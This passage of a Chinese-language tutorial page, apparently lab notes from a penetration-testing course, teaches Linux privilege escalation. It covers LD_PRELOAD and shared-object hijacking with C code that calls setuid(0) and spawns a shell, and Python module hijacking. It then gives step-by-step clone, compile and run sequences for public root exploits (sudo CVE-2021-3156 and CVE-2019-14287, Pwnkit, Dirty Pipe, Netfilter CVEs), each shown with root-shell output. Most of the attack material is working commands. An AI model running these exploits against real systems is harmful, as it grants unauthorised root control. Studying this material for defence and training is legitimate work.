-shared -o root.so root.c -nostartfiles</span><br></pre></td></tr></table></figure><p>指定恶意库文件的完整路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><h1 id="Shared-Object-Hijacking"><a href="#Shared-Object-Hijacking" class="headerlink" title="Shared Object Hijacking"></a>Shared Object Hijacking</h1><p>正在开发的程序和二进制文件通常具有与之关联的自定义库。</p><p><code>ldd</code> 显示对象的位置以及针对程序的每个依赖项将其加载到内存中的十六进制地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ldd payroll</span><br><span class="line"></span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffcb3133000)</span><br><span class="line">libshared.so =&gt; /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)</span><br></pre></td></tr></table></figure><p>看到一个名为<code>libshared.so</code>的非标准库被列为二进制文件的依赖项。如前所述，可以从自定义位置加载共享库。配置就是这样一种设置<code>RUNPATH</code>。此文件夹中的库优先于其他文件夹。可以使用<a href="https://man7.org/linux/man-pages/man1/readelf.1.html">readelf</a>实用程序检查这一点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -d payroll  | grep PATH</span><br><span class="line"></span><br><span class="line"> 0x000000000000001d (RUNPATH)            Library runpath: [/development]</span><br></pre></td></tr></table></figure><p>该配置允许从<code>/development</code>文件夹加载库，所有用户均可写入。可以通过将恶意库放置在<code>/development</code>中来利用此错误配置，该库将优先于其他文件夹，因为此文件中的条目会首先被检查（在配置文件中存在的其他文件夹之前）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ls -la /development/</span><br><span class="line"></span><br><span class="line">total 8</span><br><span class="line">drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./</span><br><span class="line">drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../</span><br></pre></td></tr></table></figure><p>在编译库之前，需要找到二进制文件调用的函数名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ ldd payroll</span><br><span class="line"></span><br><span class="line">linux-vdso.so.1 (0x00007ffd22bbc000)</span><br><span class="line">libshared.so =&gt; /development/libshared.so (0x00007f0c13112000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)</span><br><span class="line"></span><br><span class="line">$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so</span><br><span class="line"></span><br><span class="line">$ ./payroll </span><br><span class="line"></span><br><span class="line">./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery</span><br></pre></td></tr></table></figure><p>运行<code>ldd</code>二进制文件会列出库的路径<code>/development/libshared</code>，这意味着它存在漏洞。执行二进制文件会抛出一个错误，指出找不到名为的函数<code>dbquery</code>。可以编译一个包含此函数的共享对象。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dbquery</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Malicious library loaded\n&quot;</span>);</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh -p&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc src.c -fPIC -shared -o /development/libshared.so</span><br></pre></td></tr></table></figure><p>exploit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ./payroll </span><br><span class="line"></span><br><span class="line">***************Inlane Freight Employee Database***************</span><br><span class="line"></span><br><span class="line">Malicious library loaded</span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)</span><br></pre></td></tr></table></figure><h1 id="Python-Library-Hijacking"><a href="#Python-Library-Hijacking" class="headerlink" title="Python Library Hijacking"></a>Python Library Hijacking</h1><h2 id="错误的写入权限"><a href="#错误的写入权限" class="headerlink" title="错误的写入权限"></a>错误的写入权限</h2><p>查看<code>mem_status.py</code>脚本的设置权限，可以看到它有一个<code>SUID</code>设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l mem_status.py</span><br><span class="line"></span><br><span class="line">-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py</span><br></pre></td></tr></table></figure><p>查看脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import psutil</span><br><span class="line"></span><br><span class="line">available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total</span><br><span class="line"></span><br><span class="line">print(f&quot;Available memory: &#123;round(available_memory, 2)&#125;%&quot;)</span><br></pre></td></tr></table></figure><p>第二行看到这个脚本导入了模块<code>psutil</code>并使用了函数<code>virtual_memory()</code>。因此，可以在文件夹中查找此功能<code>psutil</code>并检查该模块是否具有写入权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ grep -r &quot;def virtual_memory&quot; /usr/local/lib/python3.8/dist-packages/psutil/*</span><br><span class="line"></span><br><span class="line">/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():</span><br><span class="line">/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():</span><br><span class="line">/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():</span><br><span class="line">/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():</span><br><span class="line">/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():</span><br><span class="line">/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():</span><br><span class="line">/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py</span><br><span class="line"></span><br><span class="line">-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py</span><br></pre></td></tr></table></figure><p>注入代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">...SNIP...</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">virtual_memory</span>():</span><br><span class="line"></span><br><span class="line">...SNIP...</span><br><span class="line"><span class="comment">#### Hijacking</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">...SNIP...</span><br></pre></td></tr></table></figure><p>exploit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python3 ./mem_status.py</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">Available memory: 79.22%</span><br></pre></td></tr></table></figure><h2 id="Library-Path"><a href="#Library-Path" class="headerlink" title="Library Path"></a>Library Path</h2><p>在 Python 中，每个版本都有指定的搜索和导入库 (<code>modules</code>) 的顺序。Python 导入<code>modules</code>的顺序基于优先级系统，这意味着列表中较高的路径优先于列表中较低的路径。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -c &#x27;import sys; print(&quot;\n&quot;.join(sys.path))&#x27;</span><br><span class="line"></span><br><span class="line">/usr/lib/python38.zip</span><br><span class="line">/usr/lib/python3.8</span><br><span class="line">/usr/lib/python3.8/lib-dynload</span><br><span class="line">/usr/local/lib/python3.8/dist-packages</span><br><span class="line">/usr/lib/python3/dist-packages</span><br></pre></td></tr></table></figure><p>为了能够使用此改变，需要满足两个先决条件：</p><ol><li>脚本导入的模块位于通过 <code>PYTHONPATH</code> 变量列出的较低优先级路径之一下。</li><li>必须对列表中具有较高优先级的路径之一具有写权限。</li></ol><p>如果导入的模块位于列表中较低的路径中，并且用户可以编辑更高优先级的路径，可以自己创建一个具有相同名称的模块并包含自己想要的功能。由于更高优先级的路径会更早被读取并检查相关模块，因此 Python 会访问它找到的第一个匹配项并将其导入，然后再到达原始和预期的模块。</p><p>查看安装位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ pip3 show psutil</span><br><span class="line"></span><br><span class="line">...SNIP...</span><br><span class="line">Location: /usr/local/lib/python3.8/dist-packages</span><br><span class="line"></span><br><span class="line">...SNIP...</span><br></pre></td></tr></table></figure><p>查看环境中是否存在任何错误配置，以允许<code>write</code>访问其中任何一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ls -la /usr/lib/python3.8</span><br><span class="line"></span><br><span class="line">total 4916</span><br><span class="line">drwxr-xrwx 30 root root 20480 Dec 14 16:26 .</span><br><span class="line">...SNIP...</span><br></pre></td></tr></table></figure><p>路径配置错误，允许任何用户对其进行写入。通过与 PYTHONPATH 变量的值进行交叉检查，可以看到此路径在列表中的位置高于安装 psutil 的路径。尝试利用此错误配置在 &#x2F;usr&#x2F;lib&#x2F;python3.8 目录中创建自己的 psutil 模块，其中包含自己的恶意 virtual_memory() 函数。</p><p>为了达到这一点，需要在前面提到的目录中创建与导入具有相同的名称一个名为的文件（<code>psutil.py</code>），其中包含下面列出的内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">virtual_memory</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;id&#x27;</span>)</span><br></pre></td></tr></table></figure><p>exploit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python3 mem_status.py</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;mem_status.py&quot;, line 4, in &lt;module&gt;</span><br><span class="line">    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total</span><br><span class="line">AttributeError: &#x27;NoneType&#x27; object has no attribute &#x27;available&#x27; </span><br></pre></td></tr></table></figure><h1 id="Vulnerabilities"><a href="#Vulnerabilities" class="headerlink" title="Vulnerabilities"></a>Vulnerabilities</h1><h2 id="Sudo"><a href="#Sudo" class="headerlink" title="Sudo"></a>Sudo</h2><h3 id="CVE-2021-3156"><a href="#CVE-2021-3156" class="headerlink" title="CVE-2021-3156"></a>CVE-2021-3156</h3><p>CVE-2021-3156 并且基于基于堆的缓冲区溢出漏洞。这影响了 sudo 版本：</p><ul><li>1.8.31——Ubuntu 20.04</li><li>1.8.27 - Debian 10</li><li>1.9.2 - Fedora 33</li><li>others</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -V</span><br><span class="line"></span><br><span class="line">Sudo version 1.8.31</span><br><span class="line">...SNIP...</span><br><span class="line"></span><br><span class="line">$ cat /etc/lsb-release</span><br><span class="line"></span><br><span class="line">DISTRIB_ID=Ubuntu</span><br><span class="line">DISTRIB_RELEASE=20.04</span><br><span class="line">DISTRIB_CODENAME=focal</span><br><span class="line">DISTRIB_DESCRIPTION=&quot;Ubuntu 20.04.1 LTS&quot;</span><br></pre></td></tr></table></figure><p>exploit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/blasty/CVE-2021-3156.git</span><br><span class="line">$ cd CVE-2021-3156</span><br><span class="line">$ make</span><br><span class="line">$ ./sudo-hax-me-a-sandwich</span><br><span class="line"></span><br><span class="line">** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;</span><br><span class="line"></span><br><span class="line">  usage: ./sudo-hax-me-a-sandwich &lt;target&gt;</span><br><span class="line"></span><br><span class="line">  available targets:</span><br><span class="line">  ------------------------------------------------------------</span><br><span class="line">    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27</span><br><span class="line">    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31</span><br><span class="line">    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28</span><br><span class="line">  ------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">  manual mode:</span><br><span class="line">    ./sudo-hax-me-a-sandwich &lt;smash_len_a&gt; &lt;smash_len_b&gt; &lt;null_stomp_len&gt; &lt;lc_all_len&gt;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">$ ./sudo-hax-me-a-sandwich 1</span><br><span class="line"></span><br><span class="line">** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;</span><br><span class="line"></span><br><span class="line">using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 [&#x27;/usr/bin/sudoedit&#x27;] (56, 54, 63, 212)</span><br><span class="line">** pray for your rootshell.. **</span><br><span class="line"></span><br><span class="line"># id</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><h3 id="Sudo-Policy-Bypass"><a href="#Sudo-Policy-Bypass" class="headerlink" title="Sudo Policy Bypass"></a>Sudo Policy Bypass</h3><p><a href="https://www.sudo.ws/security/advisories/minus_1_uid/">CVE-2019-14287</a>，影响了<code>1.8.28</code>以下所有版本，即使使用简单的命令也可以提升权限，只需要一个先决条件。它必须允许<code>/etc/sudoers</code>文件中的用户执行特定命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -l</span><br><span class="line">[sudo] password for cry0l1t3: **********</span><br><span class="line"></span><br><span class="line">User cry0l1t3 may run the following commands on Penny:</span><br><span class="line">    ALL=(ALL) /usr/bin/id</span><br></pre></td></tr></table></figure><p>如果在 sudo 中输入负 ID (-1)，则将处理只有 root 才拥有的 ID 0。因此，这会导致直接进入 root shell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -u#-1 id</span><br><span class="line"></span><br><span class="line">root@nix02:～# id</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)</span><br></pre></td></tr></table></figure><h2 id="Polkit"><a href="#Polkit" class="headerlink" title="Polkit"></a>Polkit</h2><p>PolicyKit ( <code>polkit</code>) 是基于 Linux 的操作系统上的授权服务，允许用户软件和系统组件在用户软件获得授权的情况下相互通信。</p><p>PolKit 附带三个附加程序：</p><ul><li><code>pkexec</code>- 使用其他用户的权限或 root 权限运行程序</li><li><code>pkaction</code>- 可用于显示动作</li><li><code>pkcheck</code>- 这可用于检查某个进程是否被授权执行特定操作</li></ul><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034">CVE-2021-4034 </a>内存损坏漏洞，也称为<a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034">Pwnkit</a>，同样会导致权限提升。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ pkexec -u root id</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><p>exploit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/arthepsy/CVE-2021-4034.git</span><br><span class="line">$ cd CVE-2021-4034</span><br><span class="line">$ gcc cve-2021-4034-poc.c -o poc</span><br><span class="line">$ ./poc</span><br><span class="line"></span><br><span class="line"># id</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><h2 id="Dirty-Pipe"><a href="#Dirty-Pipe" class="headerlink" title="Dirty Pipe"></a>Dirty Pipe</h2><p><a href="https://dirtypipe.cm4all.com/">Dirty Pipe</a> ( <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847">CVE-2022-0847</a> ) 漏洞允许未经授权写入 Linux 上的 root 用户文件。从版本<code>5.8</code>到<code>5.17</code>的所有内核都受到影响，并且容易受到此漏洞的影响。</p><p>简单来说，只要用户有读取文件的权限，此漏洞便可让用户写入任意文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git</span><br><span class="line">$ cd CVE-2022-0847-DirtyPipe-Exploits</span><br><span class="line">$ ./compile.sh</span><br></pre></td></tr></table></figure><p>第一个漏洞利用版本（<code>exploit-1</code>）修改了<code>/etc/passwd</code>并为提供了具有 root 权限的提示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ./exploit-1</span><br><span class="line"></span><br><span class="line">Backing up /etc/passwd to /tmp/passwd.bak ...</span><br><span class="line">Setting root password to &quot;piped&quot;...</span><br><span class="line">Password: Restoring /etc/passwd from /tmp/passwd.bak...</span><br><span class="line">Done! Popping shell... (run commands now)</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><p>第二个漏洞脚本（<code>exploit-2</code>），可以以 root 权限执行 SUID 二进制文件。在执行此操作之前，首先需要找到这些 SUID 二进制文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ find / -perm -4000 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">...SNPI...</span><br></pre></td></tr></table></figure><p>exploit-2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ./exploit-2 /usr/bin/sudo</span><br><span class="line"></span><br><span class="line">[+] hijacking suid binary..</span><br><span class="line">[+] dropping suid shell..</span><br><span class="line">[+] restoring suid binary..</span><br><span class="line">[+] popping root shell.. (dont forget to clean up /tmp/sh ;))</span><br><span class="line"></span><br><span class="line"># id</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),1000(cry0l1t3)</span><br></pre></td></tr></table></figure><h2 id="Netfilter"><a href="#Netfilter" class="headerlink" title="Netfilter"></a>Netfilter</h2><p><code>Netfilter</code>是一个 Linux 内核模块，提供数据包过滤、网络地址转换和其他与防火墙相关的工具。它通过根据数据包的特征和规则操纵单个数据包来控制和调节网络流量。当接收和发送网络数据包时，它会启动其他模块（如数据包过滤器）的执行。然后，这些模块可以拦截和操纵数据包。</p><p>这个内核模块主要有三个功能：</p><ol><li>数据包碎片整理</li><li>连接跟踪</li><li>网络地址转换 (NAT)</li></ol><p>当模块被激活时，所有 IP 数据包都会经过 <code>Netfilter</code> 的检查，然后才会转发到自身或远程系统的目标应用程序。</p><h3 id="CVE-2021-22555"><a href="#CVE-2021-22555" class="headerlink" title="CVE-2021-22555"></a>CVE-2021-22555</h3><p> <a href="https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555">CVE-2021-22555</a> 影响的内核版本：2.6 - 5.11</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c</span><br><span class="line">$ gcc -m32 -static exploit.c -o exploit</span><br><span class="line">$ ./exploit</span><br><span class="line"></span><br><span class="line">[+] Linux Privilege Escalation by theflow@ - 2021</span><br><span class="line"></span><br><span class="line">[+] STAGE 0: Initialization</span><br><span class="line">[*] Setting up namespace sandbox...</span><br><span class="line">[*] Initializing sockets and message queues...</span><br><span class="line"></span><br><span class="line">[+] STAGE 1: Memory corruption</span><br><span class="line">[*] Spraying primary messages...</span><br><span class="line">[*] Spraying secondary messages...</span><br><span class="line">[*] Creating holes in primary messages...</span><br><span class="line">[*] Triggering out-of-bounds write...</span><br><span class="line">[*] Searching for corrupted primary message...</span><br><span class="line">[+] fake_idx: fff</span><br><span class="line">[+] real_idx: fdf</span><br><span class="line"></span><br><span class="line">...SNIP...</span><br><span class="line"></span><br><span class="line">root@ubuntu:/home/cry0l1t3# id</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><h3 id="CVE-2022-25636"><a href="#CVE-2022-25636" class="headerlink" title="CVE-2022-25636"></a>CVE-2022-25636</h3><p><a href="https://github.com/Bonfee/CVE-2022-25636">CVE-2022-25636</a> 影响 Linux 内核 5.4 到 5.6.10</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/Bonfee/CVE-2022-25636.git</span><br><span class="line">$ cd CVE-2022-25636</span><br><span class="line">$ make</span><br><span class="line">$ ./exploit</span><br><span class="line"></span><br><span class="line">[*] STEP 1: Leak child and parent net_device</span><br><span class="line">[+] parent net_device ptr: 0xffff991285dc0000</span><br><span class="line">[+] child  net_device ptr: 0xffff99128e5a9000</span><br><span class="line"></span><br><span class="line">[*] STEP 2: Spray kmalloc-192, overwrite msg_msg.security ptr and free net_device</span><br><span class="line">[+] net_device struct freed</span><br><span class="line"></span><br><span class="line">[*] STEP 3: Spray kmalloc-4k using setxattr + FUSE to realloc net_device</span><br><span class="line">[+] obtained net_device struct</span><br><span class="line"></span><br><span class="line">[*] STEP 4: Leak kaslr</span><br><span class="line">[*] kaslr leak: 0xffffffff823093c0</span><br><span class="line">[*] kaslr base: 0xffffffff80ffefa0</span><br><span class="line"></span><br><span class="line">[*] STEP 5: Release setxattrs, free net_device, and realloc it again</span><br><span class="line">[+] obtained net_device struct</span><br><span class="line"></span><br><span class="line">[*] STEP 6: rop :)</span><br><span class="line"></span><br><span class="line"># id</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><h3 id="CVE-2023-32233"><a href="#CVE-2023-32233" class="headerlink" title="CVE-2023-32233"></a>CVE-2023-32233</h3><p><a href="https://github.com/Liuk3r/CVE-2023-32233">CVE-2023-32233</a> 此漏洞利用了 Linux 内核 6.3.1 及以上版本中的 Use-After-Free 漏洞，利用了 nf_tables 中所谓的匿名集。这些 nf_tables 是处理批处理请求的临时工作区，处理完成后，这些匿名集应该被清除（Use-After-Free），因此无法再使用。由于代码错误，这些匿名集未得到正确处理，程序仍然可以访问和修改它们。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 